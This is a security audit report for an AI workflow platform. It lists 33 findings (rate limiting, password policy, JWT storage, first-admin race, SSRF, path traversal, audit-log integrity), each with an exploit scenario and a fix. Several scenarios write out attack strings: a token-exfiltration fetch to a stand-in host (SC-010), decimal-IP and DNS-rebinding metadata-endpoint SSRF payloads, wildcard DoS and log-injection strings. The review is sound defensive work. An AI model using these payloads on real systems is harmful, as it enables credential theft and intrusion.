# Security Review — Helix AI Migration (review-v5)

## Summary
- Findings: **Critical 3 / High 10 / Medium 12 / Low 8** (33 total)
- Top systemic risks:
  1. **Rate limiting is silently disabled outside production** (`Limiter(enabled=settings.APP_ENV == "production")`). Every staging/dev/CI environment ships with no brute-force, login-flood, or LLM-spam throttle — and any deployment that forgets to set `APP_ENV=production` falls in the same hole. Combined with no password-strength policy, login is wide-open in any non-prod stack reachable from the internet.
  2. **No password-strength policy** anywhere in the system. `UserLogin`, `FirstAdminSetup`, `AcceptInviteRequest`, `PasswordResetConfirm`, and impersonation all accept a single empty-string `password: str` with no min length, character-class, or breached-list check. An attacker accepting an invitation can set `password=""`.
  3. **JWTs persisted in `localStorage`**, accessible to any XSS in any page. Logout is purely client-side — the token is removed from `localStorage` but `revoke_token()` is never called, so a stolen JWT keeps working for the full `JWT_ACCESS_TOKEN_EXPIRE_MINUTES` (60 min default).
  4. **Trust-on-first-use first-admin bootstrap is unauthenticated** (`POST /auth/first-admin` rate-limited 5/min). The first network caller after `alembic upgrade head` owns the platform; on production rollouts where the URL is reachable before the operator gets to it, an attacker can pre-empt.
  5. **Cross-org IDOR risk in audit chain**: `superadmin._audit_super` writes audit rows against a string sentinel `"platform"` org id; any code path that accidentally accepts `org_id="platform"` from user input would shadow the super-admin audit chain.

## Findings

### CRITICAL

#### SC-001: Rate limiter no-ops outside production
- **File**: `backend/app/rate_limiting.py:42` and `:48`
- **Category**: DoS / Auth brute-force
- **Issue**: Both `limiter` and `org_limiter` are constructed with `enabled=settings.APP_ENV == "production"`. The `@limiter.limit("10/minute")` decorators on `/auth/login`, `/auth/first-admin`, `/auth/password-reset/request`, `/auth/sse-ticket`, `/auth/refresh`, `/invitations`, `/connectors/test`, etc. become no-ops. The shipped `.env` ships with `APP_ENV=development`, and any operator who forgets the prod toggle gets zero rate limiting.
- **Exploit scenario**: Attacker scripts `/api/v1/auth/login` against an internet-reachable staging host with millions of credential-stuffing attempts. Backend bcrypt cost (12) is the only brake — ~10 req/s per worker, enough to exhaust a leaked-password list overnight.
- **Fix**: Always enable the limiter (`enabled=True`). Provide an explicit opt-out env var (`HELIX_DISABLE_RATE_LIMIT=1`) for test runners only. Add a startup log line on the rare disabled path so it cannot be silent.
- **CWE**: CWE-307

#### SC-002: No password-strength validation anywhere
- **File**: `backend/app/schemas/identity.py:8-11, 38-40, 78-83`; `backend/app/services/invitation_service.py:97`; `backend/app/api/auth.py:21-22` (`PasswordResetConfirm.new_password`)
- **Category**: AuthN
- **Issue**: Every password input is a bare `password: str` with no length cap, no minimum length, no entropy/zxcvbn check, and no breached-list lookup. `accept_invitation()` calls `hash_password(password)` directly. An invited user can pick `""`, `"a"`, or `"password"`.
- **Exploit scenario**: Attacker either (a) accepts a legitimate invite with a trivial password they then re-use on the platform unimpeded, or (b) brute-forces existing accounts that were created with weak passwords (very cheap given SC-001).
- **Fix**: Add a `validate_password()` helper enforcing min 12 chars, upper+lower+digit+symbol or zxcvbn ≥ 3, and a max length (~128 to bound bcrypt CPU). Apply in `FirstAdminSetup`, `AcceptInviteRequest`, `PasswordResetConfirm`, and any future user-create.
- **CWE**: CWE-521

#### SC-003: Plaintext `.env` with placeholder secrets ships in the working tree
- **File**: `.env` (project root) — lines 4 (`APP_SECRET_KEY=change_me`), 12 (`POSTGRES_PASSWORD=helix_password`), 24 (`JWT_SECRET_KEY=change_me`), 26 (`ENCRYPTION_KEY=change_me_32_byte_key`)
- **Category**: Secrets
- **Issue**: `.env` is `.gitignore`d (good) but still exists on disk with hardcoded weak defaults. `APP_ENV=development` bypasses the `model_post_init` checks in `core/config.py:82` that would otherwise refuse these values. A developer who copies the project (or whose machine is compromised) is shipping known-weak keys. `backend/test.db` (430 KB) is also present on disk; even though `.gitignore` covers `*.db`, the file is shipped to anyone reading the repo bundle.
- **Exploit scenario**: Anyone with read access to the workstation can forge JWTs (`change_me` is the secret), decrypt every stored secret in Postgres (`Fernet(change_me_32_byte_key)` after the sha256 fallback), and connect to the dev Postgres as `helix:helix_password`. SQLite `test.db` may contain real data from past test runs.
- **Fix**: Move `.env` out of the working tree (`~/.config/helix/.env`), or have `scripts/generate-secrets.*` refuse to run when an `.env` already contains a `change_me*` value. Delete `backend/test.db` and add an explicit pre-commit hook check. Document in CONTRIBUTING.md.
- **CWE**: CWE-798, CWE-538

---

### HIGH

#### SC-010: JWT lives in `localStorage` — XSS-readable; client-side logout never revokes
- **File**: `frontend/src/lib/auth-context.tsx:36, 63, 94, 101`
- **Category**: AuthN / XSS amplification
- **Issue**: `localStorage.setItem("helix_token", ...)` exposes the bearer to any JS that runs in the page. `logout()` only removes from `localStorage`; it never calls `POST /api/v1/auth/logout` (which would revoke the token in Redis). A stolen token survives logout for 60 min.
- **Exploit scenario**: Any reflected XSS, browser extension, or supply-chain JS injection exfiltrates the token via `fetch("evil.com?t="+localStorage.helix_token)`. Even legitimate logout doesn't burn the token, so an attacker who grabbed it 10 seconds before logout still owns the session for an hour.
- **Fix**: Move to `Secure; HttpOnly; SameSite=Strict` cookies issued by the backend, OR call `fetch("/api/v1/auth/logout", {method:"POST", headers:{Authorization:...}})` from the client logout path. Add a short-window CSP `default-src 'self'` to make exfil harder.
- **CWE**: CWE-922, CWE-613

#### SC-011: First-admin bootstrap is a race
- **File**: `backend/app/api/auth.py:29-37`; `backend/app/services/auth_service.py:57-86`
- **Category**: AuthZ / IDOR
- **Issue**: `POST /auth/first-admin` is unauthenticated, rate-limited `5/minute` (and not even that outside prod — see SC-001). It checks "is there already a super_admin?" and if not, creates the super admin from the request body. There is no out-of-band token, no localhost guard, no `setup_complete` flag persisted in env.
- **Exploit scenario**: An operator runs `alembic upgrade head` and starts the backend behind a load balancer. Between that and the operator browsing to `/setup/first-admin`, an attacker who knows the URL POSTs first and owns the platform.
- **Fix**: Require a one-time `SETUP_TOKEN` env var (printed once by `alembic upgrade head` or `setup.sh`) that must be sent in `X-Setup-Token`. Refuse the call when the connection is not from a private network unless that token is present.
- **CWE**: CWE-306

#### SC-012: Impersonation token grants 15 min of full target-user access with no kill-switch
- **File**: `backend/app/api/superadmin.py:129-158`
- **Category**: AuthZ / Audit
- **Issue**: `POST /superadmin/impersonate` mints a 15-min JWT for any target user with `imp_by` + `imp_reason` claims. The impersonation token is a regular bearer that passes every downstream `get_current_user_id` check — every audit row written during impersonation is attributed to the *target*, not the super-admin (the `imp_by` claim is never read by `write_audit`). There is no way for the target user to know they were impersonated and no UI surface to revoke the live token before 15 min elapses.
- **Exploit scenario**: A rogue super-admin can mutate any tenant's data with attribution blamed on the tenant user. Compliance auditors looking at the audit log see legitimate-looking actions.
- **Fix**: (a) Have `decode_access_token` propagate `imp_by` into `request.state.impersonator_id`. (b) Make `write_audit` record both `actor_id=helix_user` and `impersonator_id` columns. (c) Add a "revoke active impersonations" admin button (track minted jti in a Redis set per super-admin).
- **CWE**: CWE-269, CWE-778

#### SC-013: SSE ticket can be replayed in URL — leaks via Referer / proxy logs
- **File**: `backend/app/api/auth.py:57-84`; `backend/app/api/agent_workflows.py:258-348`; `backend/app/api/sprints.py:113+`
- **Category**: AuthN
- **Issue**: Even though the SSE ticket is 60s-bound and `scope=sse`, it still ends up in `?token=...` query strings that are logged by Caddy, copied via Referer to any image the SSE response references, and rendered in `History.replaceState` browser histories. The mitigation comment notes the leak window is "narrowed" but not closed.
- **Exploit scenario**: A Caddy access log dump exposes valid 60-second tickets that can still be replayed within their TTL. Shared dev environments aggregating logs to Datadog/SumoLogic surface them to anyone with log-read.
- **Fix**: Bind ticket to caller IP + UA hash at mint time, verify on use. Alternatively switch SSE to fetch-based streaming (`Response.body.getReader`) with `Authorization` header — modern browsers support this.
- **CWE**: CWE-598, CWE-294

#### SC-014: Workflow `artifact-content` endpoint reads arbitrary on-disk files allowed by step rows
- **File**: `backend/app/api/agent_workflows.py:191-219`
- **Category**: Path traversal / IDOR
- **Issue**: Path-traversal is guarded only by an allowlist of `step["artifact_path"]` values stored in the workflow rows. Those step rows are populated by the *worker* via `update_workflow_run_status` and can include any absolute path the worker writes. If the worker is ever compromised (or a future bug lets a workflow author influence `artifact_path`), the API will happily serve `/etc/passwd` because the path exists in `allowed_paths`.
- **Exploit scenario**: Combined with prompt-injection at the BMAD layer (operator overrides ‑ SEC-016 in workflow_ops only stops chat-template markers, not arbitrary file paths the model might persuade the worker to record), an attacker can persuade the planning workflow to write `artifact_path=/etc/shadow` to a step row, then GET it back.
- **Fix**: Hard-pin `artifact-content` paths to the canonical BMAD output root (`Path(settings.ARTIFACT_STORAGE_PATH)` and the `_bmad-output` volume mount). Reject any path that doesn't `is_relative_to()` one of those two.
- **CWE**: CWE-22

#### SC-015: SSRF host allowlist is bypassed for the GET/PATCH config endpoints and connector test by-id paths in certain code paths
- **File**: `backend/app/api/connectors.py:55, 89-104` and `backend/app/api/projects.py:181-263`
- **Category**: SSRF
- **Issue**: `_enforce_host_allowlist` resolves hostnames via `socket.getaddrinfo` and rejects if *any* returned IP is private. This is racy — DNS rebinding (TTL=0) can return `1.2.3.4` to admission and `127.0.0.1` to the actual SQLAlchemy connect. Also the env-var escape hatch `HELIX_ALLOW_PRIVATE_HOSTS=1` is read once at module import time (`_ALLOW_PRIVATE = os.environ.get(...)`); operators flipping it at runtime without restart get inconsistent state.
- **Exploit scenario**: Attacker registers `evil.example.com` with two A records, one public (admission passes) and one `169.254.169.254` (resolved at SQLAlchemy connect time on a different TTL). The connector then dials AWS IMDS with the user-controlled connection string, exfiltrating IAM credentials in `pyodbc`/`psycopg2` error messages.
- **Fix**: Pin the resolved IP at admission and pass it as `?hostaddr=<ip>` (or per-driver equivalent) so DNS resolution at connect time is bypassed. Make `HELIX_ALLOW_PRIVATE_HOSTS` a `settings.*` field re-read per call.
- **CWE**: CWE-918, CWE-350

#### SC-016: Knowledge `search` endpoint uses ILIKE with no escape — pattern DoS + index thrash
- **File**: `backend/app/api/knowledge.py:157-169`; `backend/app/services/knowledge_search.py` (search function)
- **Category**: DoS / Injection
- **Issue**: `q` validates `min_length=2, max_length=500` (good) but is then passed verbatim to the search service. If the underlying `ILIKE '%' || q || '%'` does not escape `%` and `_`, an attacker can submit `q="%%%%%%%%%%%%%%%%%%%%%%%%%%%%"` causing a full-table scan with backtracking, or use the regex backend (when added) to land a regex-DoS.
- **Exploit scenario**: A logged-in member sends 50 concurrent `q="%%_%_%_%_%_%_%_%_%_%_%_%_%_%_%"` requests. Postgres CPU spikes, knocking the whole org's read path offline.
- **Fix**: In the search service, replace `%` and `_` in `q` with `\%`/`\_` before composing the ILIKE pattern. When the planned vector/regex backend lands, run the regex inside `re2` (no backtracking) and time-limit at 200ms.
- **CWE**: CWE-1333, CWE-89

#### SC-017: `validate_external_url` uses `parsed.hostname` — does not handle IPv6 / userinfo edge cases
- **File**: `backend/app/security/ssrf.py:64`
- **Category**: SSRF
- **Issue**: `parsed.hostname` lowercases and strips userinfo, but URLs of the form `http://evil.com#@127.0.0.1/` or `http://[::1]/` (raw IPv6 brackets) are not normalised to the IP form before the denylist check; `_FORBIDDEN_HOSTS` only carries `"169.254.169.254"` literal, missing `[::ffff:a9fe:a9fe]`, decimal-encoded IPs (`http://2852039166/`), and 0.0.0.0 (`is_unspecified`, but only post-resolution).
- **Exploit scenario**: Attacker submits webhook URL `http://2852039166/` (decimal IMDS) or `http://[0::ffff:169.254.169.254]/`. `getaddrinfo` still resolves to the metadata IP; the check catches it *if* DNS returns the IP — but URLs with literal IP-in-host short-circuit the resolution path (`is_private` etc. would catch a literal `169.254.169.254`, but not a decimal-encoded one because `urlparse(...).hostname` returns the literal string).
- **Fix**: After parsing, attempt `ipaddress.ip_address(parsed.hostname)`; on success run `_is_forbidden_ip` directly without DNS. On failure, follow the existing DNS path. Add decimal/hex IP detection.
- **CWE**: CWE-918

#### SC-018: `/health` and `/readyz` exposed without auth but `/system/health` requires admin — DB existence/down state leaks
- **File**: `backend/app/api/health.py:43-68`
- **Category**: Info disclosure
- **Issue**: `/api/v1/readyz` returns `503 {status:"not_ready", database:"down"}` to anyone. This is now sanitised (no host:port) — good — but the *response code itself* still reveals when the DB is down, which an attacker can correlate with their DDoS attempt or use to time a TOCTOU during failover.
- **Exploit scenario**: Limited but present: attacker monitors `/readyz` to time exploitation windows.
- **Fix**: Bind `/readyz` to the loopback interface or require a Kubernetes-style `?probe_token=<env>` for production. Keep `/health` (liveness) public.
- **CWE**: CWE-200

#### SC-019: `requirement_text` and `meta` blobs flow into Temporal + LLM with no length cap
- **File**: `backend/app/api/agent_workflows.py:27-30`; `backend/app/services/workflow_service.py` (start_bmad_planning_workflow)
- **Category**: DoS / cost amplification
- **Issue**: `StartWorkflowRequest.requirement_text: str | None` has no `max_length`. The full string is concatenated into the LLM system prompt for every BMAD agent — a 10 MB requirement text gets sent N times to a paid API.
- **Exploit scenario**: A malicious org member burns the org's LLM budget by POSTing a 1 MB `requirement_text`. Each replay triggers re-tokenisation; pair-review and rollback-gen amplify further.
- **Fix**: Add `max_length=10_000` (or whatever the BMAD upper context truly is) on every free-text Pydantic field that lands in an LLM prompt: `RequirementCreate.source_text`, `StartWorkflowRequest.requirement_text`, `ReplayRequest.requirement_text`, `ApprovalRequest.notes`.
- **CWE**: CWE-770

---

### MEDIUM

#### SC-030: Backend SECRET defaults are ephemeral but ENCRYPTION fallback re-derives from same key (legacy)
- **File**: `backend/app/services/secret_service.py:41-53`
- **Category**: Crypto
- **Issue**: The legacy Fernet key is `sha256(ENCRYPTION_KEY)` — anyone who learns the env value can decrypt both old and new ciphertext. Fine while the ENCRYPTION_KEY is strong, but the dual-key model means rotation requires rotating *both* slots together; partial rotation does nothing.
- **Fix**: Document that ENCRYPTION_KEY rotation must call `rewrap_if_legacy` for every stored secret and only then drop the legacy key. Add a maintenance endpoint `POST /admin/secrets/rewrap-all`.
- **CWE**: CWE-320

#### SC-031: Audit chain key/IV reuse — log injection via `meta` and `entity_id`
- **File**: `backend/app/api/audit.py:30-39, 108-115`
- **Category**: Logging / Audit integrity
- **Issue**: `event_metadata = json.dumps(meta)` is stored verbatim; downstream readers (CSV/PDF) call `_scrub_text` but the underlying row is still the attacker-controlled JSON. A malicious project member submitting `notes="\n2025-01-01 ADMIN admin_login\n"` can poison forensic timelines. The HMAC entry_hash does NOT cover `event_metadata` — `_compute_entry_hash` includes only id/org/actor/action/entity_type/entity_id/prev. So the chain detects re-orders but not metadata tampering.
- **Fix**: Include `sha256(event_metadata)` in the entry_hash. Strip `\r\n\x00` from any string going into AuditLog columns at write time.
- **CWE**: CWE-117, CWE-353

#### SC-032: `superadmin._audit_super(org_id="platform")` collides with any tenant called "platform"
- **File**: `backend/app/api/superadmin.py:31`
- **Category**: AuthZ / audit
- **Issue**: The sentinel string `"platform"` is used as the org_id for super-admin actions. There is no DB constraint preventing a tenant org row from having `id="platform"` (id is UUID-typed in the model but several call sites use `str(org.id)`; a tenant slug could collide if anyone forgets the type).
- **Fix**: Use the literal UUID `00000000-0000-0000-0000-000000000000` or a separate `super_admin_audit_log` table.
- **CWE**: CWE-345

#### SC-033: Slack signature accepts decoded body with `errors="replace"` — signature still passes for binary bodies
- **File**: `backend/app/api/integrations.py:62`
- **Category**: AuthN
- **Issue**: `body.decode('utf-8', errors='replace')` is used to compute the HMAC basestring. If Slack ever changes encoding (or a MITM injects non-UTF-8 bytes), the `�` substitution makes the signature not match the bytes Slack signed — silently rejecting legit traffic. Conversely the upstream HMAC must be computed over raw bytes; reusing a decoded string is a subtle protocol divergence.
- **Fix**: Recompute using `f"v0:{timestamp}:".encode() + body` and `hmac.new(secret.encode(), v0_string, ...)`.
- **CWE**: CWE-345

#### SC-034: Temporal UI bound to loopback but TEMPORAL_AUTH_ENABLED defaults `false`
- **File**: `docker-compose.yml:119-148`
- **Category**: Infra / AuthN
- **Issue**: `TEMPORAL_AUTH_ENABLED=${TEMPORAL_AUTH_ENABLED:-false}` — even though the UI is loopback-only by default, anyone with SSH access (or who flips `TEMPORAL_UI_BIND=0.0.0.0`) gets an unauthenticated workflow inspector showing every customer's planning artifacts.
- **Fix**: Refuse to start the temporal-ui container when `TEMPORAL_UI_BIND != 127.0.0.1` and `TEMPORAL_AUTH_ENABLED=false`. The compose `:?` substitution can enforce this.
- **CWE**: CWE-306

#### SC-035: CORS allow_credentials=True with regex origin (dev)
- **File**: `backend/app/main.py:164-181`; `backend/app/core/config.py:54`
- **Category**: CSRF / origin spoofing
- **Issue**: `allow_credentials=True` with `allow_origin_regex=r"^https?://(localhost|127\.0\.0\.1)(:\d+)?$"` enables cookie-cross-origin from any port. In production `CORS_ORIGIN_REGEX` is forced empty (good), but a dev who runs a malicious page on `http://localhost:12345` can read the dev API's responses with the cookie. Combined with the `localStorage` JWT (SC-010) this is a fast lateral move from any local dev server.
- **Fix**: Drop `allow_credentials=True` whenever the API is bearer-only; cookies aren't used.
- **CWE**: CWE-942

#### SC-036: `/auth/sse-ticket` mints scoped tokens but the scope claim is not actually enforced for non-SSE endpoints
- **File**: `backend/app/auth/jwt.py:282-287`; `backend/app/api/auth.py:57-84`
- **Category**: AuthZ
- **Issue**: `get_current_user_id` does not check `payload.get("scope")`. The SSE ticket is the same shape of bearer; it'll authenticate any `Authorization: Bearer <ticket>` call until the 60s TTL elapses. The two SSE handlers explicitly check `payload.get("scope") != "sse"`, but every other endpoint will silently accept the ticket as a normal bearer.
- **Exploit scenario**: A leaked SSE ticket (via URL log) can call `POST /projects/{id}/agent-workflows` for 60s — short window but not zero.
- **Fix**: Centralise: `get_current_user_id` should reject any token where `scope` is set and not `"default"`. Have `create_access_token` include `scope:"default"` by default; ticket-mint sets `scope:"sse"`; the two SSE handlers continue to accept `scope:"sse"` *only*.
- **CWE**: CWE-863

#### SC-037: Pre-computed bcrypt timing equaliser only burns CPU on user-not-found, not on inactive-user
- **File**: `backend/app/services/password_reset_service.py:41-49`
- **Category**: User enumeration
- **Issue**: When the email exists but `user.status != "active"`, the function returns at `db.query(...).first()` (line 40) with no dummy bcrypt burn. The found-active vs found-inactive vs not-found branches have distinguishable latency.
- **Fix**: Move the dummy bcrypt inside an `else` after the status check.
- **CWE**: CWE-208

#### SC-038: Webhook delivery list shows `status_code` cross-org if a delivery row leaked from another org
- **File**: `backend/app/api/webhooks.py:133-171`
- **Category**: IDOR
- **Issue**: The endpoint correctly checks the endpoint belongs to the caller's org first, then queries deliveries by `endpoint_id` only — no org filter on the delivery rows. If `WebhookDelivery` were ever populated with the wrong `endpoint_id`, the org check would not catch it. Defence-in-depth gap.
- **Fix**: Join `WebhookDelivery` against `WebhookEndpoint` and filter `WebhookEndpoint.organization_id == org_id`.
- **CWE**: CWE-639

#### SC-039: Connector configs encrypted but `config_masked` echoes truncated tail of password
- **File**: `backend/app/services/project_service.py:89-97`
- **Category**: Info disclosure
- **Issue**: `_mask_value` returns `f"***{value[-4:]}"` for sensitive keys. The last 4 chars of a real password leak via list endpoints (`GET /projects/{id}/sources` returns `config_masked` directly). Users with `project:read` (every role) see them.
- **Fix**: Return `"***"` for sensitive keys regardless of length.
- **CWE**: CWE-200

#### SC-040: GZip middleware enabled with no upper bound — BREACH / CRIME amplification risk if cookies adopted
- **File**: `backend/app/main.py:183`
- **Category**: Crypto / Web
- **Issue**: `GZipMiddleware(minimum_size=1000)` happily compresses every response over 1 KB. If a future change introduces session cookies into responses (or reflected user input is gzipped alongside a secret), BREACH-style oracle attacks become possible.
- **Fix**: Disable gzip for any endpoint that may include secrets in the body (`/auth/*`, `/llm-providers/*`). Or disable globally and rely on Caddy compression.
- **CWE**: CWE-310

#### SC-041: `MAX_UPLOAD_MB=25` enforced for body, but no per-file count limit on multi-part
- **File**: `backend/app/main.py:120-142`; `backend/app/api/artifacts.py:88-103`
- **Category**: DoS
- **Issue**: `enforce_body_size` checks total content-length, but `validate_upload` is per-file. A 25 MB body containing 25000 1-byte files would each pass and each would create a DB row + storage write.
- **Fix**: Cap `File(...)` count via FastAPI signature; reject if `len(await request.form())` exceeds N.
- **CWE**: CWE-770

---

### LOW

#### SC-050: `decode_access_token` revocation negative-cache documented 1s leak — acceptable but worth alerting
- **File**: `backend/app/auth/jwt.py:25-67`
- **Category**: Defence-in-depth
- **Issue**: As designed, a revoked token can authenticate for up to 1s after revocation due to the in-process negcache. Documented and intentional, but increases the risk on logout-then-immediately-reuse races.
- **Fix**: Set `JWT_REVOKE_NEGCACHE_TTL=0` for `/auth/refresh` flows in high-security tenants.

#### SC-051: Audit `ip_address` stores `request.client.host` — not the X-Forwarded-For
- **File**: `backend/app/api/audit.py:110`
- **Category**: Audit accuracy
- **Issue**: When Caddy proxies, `request.client.host` will always be Caddy's loopback IP. The audit record loses the true client IP. Also makes IP-rate-limiting in slowapi inaccurate (it uses the same `get_remote_address`).
- **Fix**: Parse `X-Forwarded-For` (rightmost trusted) when behind the proxy. Add a `TRUSTED_PROXIES` settings list.

#### SC-052: `bmad_loader._run_bmad_script` uses subprocess to run vendored Python scripts
- **File**: `agents/runtime/bmad_loader.py:183-204`
- **Category**: Supply chain
- **Issue**: Runs `[sys.executable, script]` with `BMAD_METHOD_ROOT` paths; if an attacker plants a `resolve_config.py` in the BMAD dir, it executes. No checksum on the vendored scripts.
- **Fix**: Pin sha256 of vendored scripts at build time; verify at runtime; fall back to the in-process tomllib path.

#### SC-053: `superadmin/users` and `superadmin/organizations` are unpaginated `.all()`
- **File**: `backend/app/api/superadmin.py:46-63, 106-121`
- **Category**: DoS
- **Issue**: Returns every row in the table. At 100k users this is 30+ MB and seconds of serialisation.
- **Fix**: Add `limit/offset` like other list endpoints.

#### SC-054: Compliance bundle pulls unbounded validation/recon result rows into memory
- **File**: `backend/app/api/compliance.py:170, 185`
- **Category**: DoS
- **Issue**: `.all()` on `ValidationResult` per run and `ReconResult` per run; a project with 10k validation results blocks the worker for the PDF generation.
- **Fix**: Cap rows-per-run at e.g. 1000 in the PDF; cite "(truncated)" if more.

#### SC-055: `requirements.lock` falls back to `requirements.txt` silently
- **File**: `backend/Dockerfile:9-14`
- **Category**: Supply chain
- **Issue**: A missing `requirements.lock` only emits a WARNING — the build proceeds with whatever transitive versions PyPI returns. Reproducibility / pinning bypass.
- **Fix**: `RUN test -f requirements.lock || exit 1` — fail closed.

#### SC-056: `metrics` endpoint blocked at Caddy but still mounted on the backend
- **File**: `backend/app/main.py:188-194`; `Caddyfile:42-44`
- **Category**: Info disclosure / Defence-in-depth
- **Issue**: Caddy returns 403 for `/metrics`, but the backend still serves it on 8000. Anyone bypassing Caddy (SSH tunnel, misconfigured firewall) gets full Prometheus metrics including request paths, latencies, and tenant labels.
- **Fix**: Bind `/metrics` to a separate port (`METRICS_PORT=9100`) reachable only from the metrics scraper, or require a static bearer.

#### SC-057: HSTS only set when `APP_ENV=production` — preview/staging deployments lack it
- **File**: `backend/app/main.py:159-160`
- **Category**: Crypto / Transport
- **Issue**: A staging deploy with `APP_ENV=staging` will not emit HSTS, allowing SSL-strip downgrade.
- **Fix**: Tie HSTS to `request.url.scheme == "https"` rather than env.

---

## Coverage Notes
- SQL identifier injection in connectors is solidly defended (`_safe_ident` + `validate_identifier`); raw SQL only appears with whitelisted identifiers — no findings there.
- No raw `eval`/`exec`/`pickle.loads`/`yaml.load` in scope.
- `dangerouslySetInnerHTML` not used in `frontend/`.
- All `target="_blank"` links carry `rel="noreferrer"` (verified `WebsiteNav.tsx`, `marketplace/page.tsx`).
- Webhook secrets, LLM API keys, and connector configs all flow through `secret_service.encrypt_value` → Fernet → Postgres.
- SSRF allowlist *does* cover most cases — gaps are DNS-rebind (SC-015) and decimal-IP encoding (SC-017).
- Audit chain is HMAC-keyed and rebuild-detectable (SC-031 narrows the gap to metadata-only tampering).
